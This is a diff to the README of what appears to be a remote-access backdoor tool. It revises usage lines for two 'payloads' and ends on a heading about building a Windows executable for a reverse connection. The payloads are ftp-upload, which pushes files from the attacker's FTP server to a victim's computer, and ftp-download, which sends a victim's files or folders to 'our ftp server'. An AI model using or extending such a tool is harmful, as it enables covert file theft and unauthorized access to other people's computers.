@@ -74,10 +74,10 @@ RETRY_TIME=5 #in seconds
 - When I get time i'll write a wiki for this payloads
 ```
 [1]ftp-upload: uploads a file from the attackers ftp server to the victims computer.
-          usage~ upload ftpserver ftpuser ftp-password file-path
+          usage~ ftp-upload file-path
 
 [2]ftp-download: downloads a file/folder from the victims computer to our ftp server.
-            usage~download ftpserver ftpuser ftp-password file-path
+            usage~ftp-download file-path
 ```
 
 ### Making a windows executable and getting a reverse connection
